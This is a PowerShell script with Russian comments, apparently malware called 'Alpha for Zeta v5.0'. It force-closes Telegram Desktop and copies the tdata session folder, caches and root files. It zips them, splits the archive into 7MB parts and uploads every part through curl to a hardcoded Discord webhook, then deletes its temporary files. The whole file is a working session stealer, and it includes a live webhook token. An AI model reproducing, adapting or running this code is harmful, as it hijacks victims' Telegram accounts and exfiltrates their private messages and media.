# ===== СКРИПТ ALPHA ДЛЯ ZETA v5.0 - РАЗБИВКА АРХИВА =====
# Discord Webhook лимит - 8MB, поэтому режем на части по 7MB

$webhook = "https://discord.com/api/webhooks/1517874969986732133/srfBAzpYR38NikmVRgDs5AoroLpvV4uBQDpjWtvLymm_qGHcY2AOMF1zDNHXDH0JrOaz"

# HWID
try { $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID } catch { $hwid = "UNKNOWN_HWID" }
$workDir = "$env:TEMP\$hwid"
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force }
New-Item -Path $workDir -ItemType Directory -Force | Out-Null

Write-Host "[*] Alpha, стартую для HWID: $hwid" -ForegroundColor Cyan

# ============================================================
# ФУНКЦИЯ ДЛЯ СОЗДАНИЯ ZIP
# ============================================================
function New-ZipArchive {
    param(
        [string]$SourceFolder,
        [string]$ZipPath
    )
    
    try {
        if (Get-Command Compress-Archive -ErrorAction SilentlyContinue) {
            Compress-Archive -Path "$SourceFolder\*" -DestinationPath $ZipPath -CompressionLevel Optimal -Force
            return $true
        }
    } catch {}
    
    try {
        $shell = New-Object -ComObject Shell.Application
        $zip = $shell.NameSpace($ZipPath)
        if (-not $zip) {
            $null = New-Item -Path $ZipPath -ItemType File -Force
            $zip = $shell.NameSpace($ZipPath)
        }
        $items = $shell.NameSpace($SourceFolder).Items()
        $zip.CopyHere($items, 16)
        Start-Sleep -Seconds 2
        return $true
    } catch {
        return $false
    }
}

# ============================================================
# ФУНКЦИЯ РАЗБИВКИ ФАЙЛА НА ЧАСТИ
# ============================================================
function Split-File {
    param(
        [string]$FilePath,
        [int]$PartSizeMB = 7
    )
    
    if (-not (Test-Path $FilePath)) { return @() }
    
    $fileSize = (Get-Item $FilePath).Length
    $partSize = $PartSizeMB * 1MB
    $parts = [math]::Ceiling($fileSize / $partSize)
    
    Write-Host "[*] Разбиваю файл на $parts частей по $PartSizeMB MB..." -ForegroundColor Yellow
    
    $partFiles = @()
    $stream = [System.IO.File]::OpenRead($FilePath)
    $buffer = New-Object byte[] $partSize
    
    for ($i = 1; $i -le $parts; $i++) {
        $read = $stream.Read($buffer, 0, $buffer.Length)
        if ($read -eq 0) { break }
        
        $partFile = "$FilePath.part$i"
        [System.IO.File]::WriteAllBytes($partFile, $buffer[0..($read-1)])
        $partFiles += $partFile
        Write-Host "[✓] Часть $i/$parts создана: $([math]::Round((Get-Item $partFile).Length/1MB,2)) MB" -ForegroundColor Green
    }
    
    $stream.Close()
    return $partFiles
}

# ============================================================
# ФУНКЦИЯ ОТПРАВКИ ФАЙЛА В DISCORD
# ============================================================
function Send-File {
    param($FilePath)
    if (-not (Test-Path $FilePath)) { return $false }
    
    $size = (Get-Item $FilePath).Length / 1MB
    
    if ($size -gt 7) {
        Write-Host "[!] Файл весит $([math]::Round($size,2)) MB (>7MB), разбиваю..." -ForegroundColor Yellow
        $parts = Split-File -FilePath $FilePath -PartSizeMB 7
        foreach ($part in $parts) {
            $result = Send-File -FilePath $part
            Remove-Item $part -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 1
        }
        return $true
    }
    
    try {
        $result = curl.exe -s -F "file=@$FilePath" $webhook
        if ($result -match "40005") {
            Write-Host "[!] Ошибка: файл слишком большой для Discord" -ForegroundColor Red
            return $false
        }
        Write-Host "[✓] Отправлен: $([System.IO.Path]::GetFileName($FilePath)) ($([math]::Round($size,2)) MB)" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[!] Ошибка отправки: $_" -ForegroundColor Red
        return $false
    }
}

# ============================================================
# БЛОК: TELEGRAM TDATA
# ============================================================
$tgPath = "$env:APPDATA\Telegram Desktop\tdata"
if (Test-Path $tgPath) {
    Write-Host "[*] Найден Telegram. Закрываю процесс..." -ForegroundColor Yellow
    Get-Process -Name "Telegram*" -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 3

    $tgRoot = "$env:TEMP\tg_$hwid"
    if (Test-Path $tgRoot) { Remove-Item $tgRoot -Recurse -Force }
    New-Item -Path $tgRoot -ItemType Directory -Force | Out-Null

    # ---- КОПИРУЕМ ВСЁ ----
    
    # 1. D877F783D5D3EF8C
    $d1 = Join-Path $tgPath "D877F783D5D3EF8C"
    if (Test-Path $d1) {
        $dest = Join-Path $tgRoot "D877F783D5D3EF8C"
        Copy-Item -Path $d1 -Destination $dest -Recurse -Force
        $cnt = (Get-ChildItem -Path $dest -Recurse -File).Count
        Write-Host "[✓] D877F783D5D3EF8C: $cnt файлов" -ForegroundColor Green
    }

    # 2. user_data/cache/номер/
    $cacheRoot = Join-Path $tgPath "user_data\cache"
    if (Test-Path $cacheRoot) {
        $numDirs = Get-ChildItem -Path $cacheRoot -Directory
        foreach ($nd in $numDirs) {
            $destDir = Join-Path $tgRoot "cache_$($nd.Name)"
            New-Item -Path $destDir -ItemType Directory -Force | Out-Null
            
            $files = Get-ChildItem -Path $nd.FullName -Recurse -File
            $counter = 1
            foreach ($f in $files) {
                $newName = "tdata_userdatacache$($nd.Name)($counter)"
                $destFile = Join-Path $destDir $newName
                Copy-Item -Path $f.FullName -Destination $destFile -Force
                $counter++
            }
            Write-Host "[✓] tdata_userdatacache$($nd.Name): $($files.Count) файлов" -ForegroundColor Green
        }
    }

    # 3. user_data/media_cache/номер/
    $mediaRoot = Join-Path $tgPath "user_data\media_cache"
    if (Test-Path $mediaRoot) {
        $numDirs = Get-ChildItem -Path $mediaRoot -Directory
        foreach ($nd in $numDirs) {
            $destDir = Join-Path $tgRoot "media_cache_$($nd.Name)"
            New-Item -Path $destDir -ItemType Directory -Force | Out-Null
            
            $files = Get-ChildItem -Path $nd.FullName -Recurse -File
            $counter = 1
            foreach ($f in $files) {
                $newName = "tdata_userdatamediacache$($nd.Name)($counter)"
                $destFile = Join-Path $destDir $newName
                Copy-Item -Path $f.FullName -Destination $destFile -Force
                $counter++
            }
            Write-Host "[✓] tdata_userdatamediacache$($nd.Name): $($files.Count) файлов" -ForegroundColor Green
        }
    }

    # 4. Корневые файлы
    $rootFiles = Get-ChildItem -Path $tgPath -File
    if ($rootFiles.Count -gt 0) {
        $counter = 1
        foreach ($f in $rootFiles) {
            $newName = "tdata($counter)"
            $destFile = Join-Path $tgRoot $newName
            Copy-Item -Path $f.FullName -Destination $destFile -Force
            $counter++
        }
        Write-Host "[✓] tdata root: $($rootFiles.Count) файлов" -ForegroundColor Green
    }

    # ---- СОЗДАЁМ АРХИВ ----
    Write-Host "[*] Создаю архив..." -ForegroundColor Cyan
    
    $totalSize = (Get-ChildItem -Path $tgRoot -Recurse -File | Measure-Object -Property Length -Sum).Sum / 1MB
    Write-Host "[*] Общий размер: $([math]::Round($totalSize,2)) MB" -ForegroundColor Yellow
    
    $zipName = "tdata_$hwid.zip"
    $zipPath = "$env:TEMP\$zipName"
    
    if (New-ZipArchive -SourceFolder $tgRoot -ZipPath $zipPath) {
        $zipSize = (Get-Item $zipPath).Length / 1MB
        Write-Host "[✓] Архив создан, размер: $([math]::Round($zipSize,2)) MB" -ForegroundColor Green
        
        # Отправляем архив с автоматической разбивкой
        Send-File -FilePath $zipPath
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    } else {
        Write-Host "[!] Не удалось создать архив, отправляю файлами..." -ForegroundColor Red
        $allFiles = Get-ChildItem -Path $tgRoot -Recurse -File
        foreach ($f in $allFiles) {
            Send-File -FilePath $f.FullName
            Start-Sleep -Milliseconds 500
        }
    }

    Remove-Item $tgRoot -Recurse -Force
    Write-Host "[✓] Telegram готов, Alpha!" -ForegroundColor Green
}

# ============================================================
# ФИНАЛ
# ============================================================
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "[✓] Всё сделано, Alpha! Архив разбит на части по 7MB и отправлен." -ForegroundColor Magenta
